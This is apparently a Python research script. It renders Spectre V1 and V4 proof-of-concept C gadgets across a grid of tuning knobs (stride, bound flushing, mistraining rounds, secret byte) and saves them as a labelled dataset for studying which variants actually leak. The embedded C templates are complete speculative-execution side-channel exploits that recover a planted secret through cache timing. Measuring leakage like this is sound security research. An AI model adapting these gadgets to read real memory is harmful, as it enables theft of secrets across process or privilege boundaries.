"""Generate V1/V4 gadgets across decisive tuning knobs, spanning
leaking <-> non-leaking, to build a labeled (gadget -> actually-leaks?) dataset.

The knobs are the ones we empirically found decide real-execution leakage:
  - stride       : probe stride (64 aliases/prefetches away the signal; 512 clean)
  - flush_bound  : flush the branch-bound / store-index each round (wide
                   speculation window). Off -> window too short -> no leak.
  - mistrain     : number of mistraining rounds (weak vs strong predictor training)
  - secret       : planted byte (jitter control)

A learned ranker is only worth building if leak status varies with these knobs
in a learnable way — that is exactly what this dataset measures.
"""
from __future__ import annotations
import os
import json
import itertools

_V1 = r'''
#include <stdint.h>
#include <stdio.h>
#include <x86intrin.h>
#define STRIDE {stride}
#define HIT 80
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}};
uint8_t unused2[64];
uint8_t array2[256*STRIDE];
uint8_t SECRET = 0;
uint8_t temp = 0;
void victim(size_t x){{ if(x<array1_size){{ temp &= array2[array1[x]*STRIDE]; }} }}
int recover_byte(size_t mx){{
  static int results[256]; int tries,i,j,k,mix,junk=0; size_t tx,x; register uint64_t t1,t2; volatile uint8_t*a;
  for(i=0;i<256;i++)results[i]=0;
  for(tries=999;tries>0;tries--){{
    for(i=0;i<256;i++)_mm_clflush(&array2[i*STRIDE]);
    tx=tries%array1_size;
    for(j={mistrain}-1;j>=0;j--){{
      {flush_bound}
      for(volatile int z=0;z<100;z++){{}}
      x=((j%6)-1)&~0xFFFF; x=(x|(x>>16)); x=tx^(x&(mx^tx));
      victim(x);
    }}
    for(i=0;i<256;i++){{
      mix=((i*167)+13)&255; a=&array2[mix*STRIDE];
      t1=__rdtscp(&junk); t1=__rdtscp(&junk); junk=*a;
      t2=__rdtscp(&junk)-t1; t2=__rdtscp(&junk)-t1;
      if(t2<=HIT && mix!=array1[tries%array1_size]) results[mix]++;
    }}
    j=k=-1;
    for(i=0;i<256;i++){{ if(j<0||results[i]>=results[j]){{k=j;j=i;}} else if(k<0||results[i]>=results[k]){{k=i;}} }}
    if(results[j]>=(2*results[k]+5)||(results[j]==2&&results[k]==0)) break;
  }}
  results[0]^=junk; return j;
}}
int main(){{
  for(int i=0;i<sizeof(array2);i++)array2[i]=1;
  SECRET={secret};
  size_t mx=(size_t)((char*)&SECRET-(char*)array1);
  int got=recover_byte(mx);
  printf("recovered=0x%02X actual=0x%02X\n",got,SECRET);
  if(got==SECRET) printf("SUCCESS! Leaked the actual SPECTRE_V1 secret.\n");
  else printf("No SPECTRE_V1 secret leaked or could not detect leakage.\n");
  return 0;
}}
'''

_V4 = r'''
#include <stdint.h>
#include <stdio.h>
#include <x86intrin.h>
#define STRIDE {stride}
#define HIT 80
uint8_t array2[256*STRIDE];
uint8_t buf[256];
volatile size_t sidx = 0;
uint8_t SECRET = 0;
uint8_t temp = 0;
void ssb_victim(){{
  {flush_bound}
  for(volatile int z=0;z<50;z++){{}}
  buf[sidx] = 0;
  temp &= array2[buf[0] * STRIDE];
}}
int recover(){{
  static int results[256]; int tries,i,j,k,mix,junk=0; register uint64_t t1,t2; volatile uint8_t*a;
  for(i=0;i<256;i++)results[i]=0;
  for(tries=999;tries>0;tries--){{
    buf[0]=SECRET; _mm_mfence();
    for(i=0;i<256;i++)_mm_clflush(&array2[i*STRIDE]);
    _mm_mfence();
    for(int r=0;r<{mistrain};r++) ssb_victim();
    for(i=0;i<256;i++){{
      mix=((i*167)+13)&255; a=&array2[mix*STRIDE];
      t1=__rdtscp(&junk); t1=__rdtscp(&junk); junk=*a;
      t2=__rdtscp(&junk)-t1; t2=__rdtscp(&junk)-t1;
      if(t2<=HIT && mix!=0) results[mix]++;
    }}
    j=k=-1;
    for(i=0;i<256;i++){{ if(j<0||results[i]>=results[j]){{k=j;j=i;}} else if(k<0||results[i]>=results[k]){{k=i;}} }}
    if(results[j]>=(2*results[k]+5)||(results[j]==2&&results[k]==0)) break;
  }}
  results[0]^=junk; return j;
}}
int main(){{
  for(int i=0;i<sizeof(array2);i++)array2[i]=1;
  SECRET={secret};
  int got=recover();
  printf("recovered=0x%02X actual=0x%02X\n",got,SECRET);
  if(got==SECRET) printf("SUCCESS! Leaked the actual SPECTRE_V4 secret.\n");
  else printf("No SPECTRE_V4 secret leaked or could not detect leakage.\n");
  return 0;
}}
'''

_TEMPLATES = {"SPECTRE_V1": _V1, "SPECTRE_V4": _V4}
_FLUSH_STMT = {
    "SPECTRE_V1": '_mm_clflush(&array1_size);',
    "SPECTRE_V4": '_mm_clflush((void*)&sidx);',
}


def render_grid(vuln_class, stride, flush_bound, mistrain, secret):
    """Render one gadget with the given knobs. flush_bound=True inserts the
    bound/index flush (wide window); False omits it (short window)."""
    if vuln_class not in _TEMPLATES:
        raise KeyError(vuln_class)
    if not (0 <= secret <= 255):
        raise ValueError("secret must be 0..255")
    flush = _FLUSH_STMT[vuln_class] if flush_bound else ""
    return _TEMPLATES[vuln_class].format(stride=stride, flush_bound=flush,
                                         mistrain=mistrain, secret=secret)


def grid_points(classes=("SPECTRE_V1", "SPECTRE_V4"),
                strides=(64, 512), flushes=(True, False),
                mistrains=(2, 30), secrets=(ord("S"),)):
    """Enumerate the knob grid as a list of dicts."""
    pts = []
    for cls, st, fl, mt, sc in itertools.product(classes, strides, flushes, mistrains, secrets):
        pts.append({"vuln_class": cls, "stride": st, "flush_bound": fl,
                    "mistrain": mt, "secret": sc})
    return pts


def generate_grid(out_dir, points=None):
    """Render every grid point to a .c file; write an index with the knobs.
    Returns index rows: {gadget_id, path, vuln_class, stride, flush_bound, mistrain, secret}."""
    os.makedirs(out_dir, exist_ok=True)
    if points is None:
        points = grid_points()
    rows = []
    for i, p in enumerate(points):
        gid = f"{p['vuln_class']}_s{p['stride']}_f{int(p['flush_bound'])}_m{p['mistrain']}_x{p['secret']}"
        path = os.path.join(out_dir, gid + ".c")
        with open(path, "w") as f:
            f.write(render_grid(p["vuln_class"], p["stride"], p["flush_bound"],
                                p["mistrain"], p["secret"]))
        rows.append({"gadget_id": gid, "path": path, **p})
    with open(os.path.join(out_dir, "grid_index.jsonl"), "w") as f:
        for r in rows:
            f.write(json.dumps(r, sort_keys=True) + "\n")
    return rows
